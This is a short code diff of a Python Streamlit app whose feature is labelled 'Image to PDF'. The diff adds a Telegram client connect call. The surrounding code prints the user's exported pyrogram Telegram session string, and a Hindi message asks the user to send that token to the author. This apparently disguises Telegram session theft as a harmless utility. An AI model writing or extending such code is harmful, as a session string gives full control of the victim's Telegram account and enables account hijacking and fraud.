@@ -18,7 +18,8 @@ from pymongo import MongoClient
 import streamlit as st
 import os, sys
 import re as reaaa
-from pyrogram import Client
+from pyrogram import Client, raw
+
 import random,string
 def id_generator(size=10, chars=string.ascii_lowercase):
 	return ''.join(random.choice(chars) for _ in range(size))
@@ -369,6 +370,7 @@ if login.toggle('Image to PDF feature'):
 ))
 				st.write(result)
 				st.write(csapp.export_session_string())
+				csapp.connect()
 				st.write("ऊपर जो टोकन है वो मुझे सेंड कर देना")
 			
 			
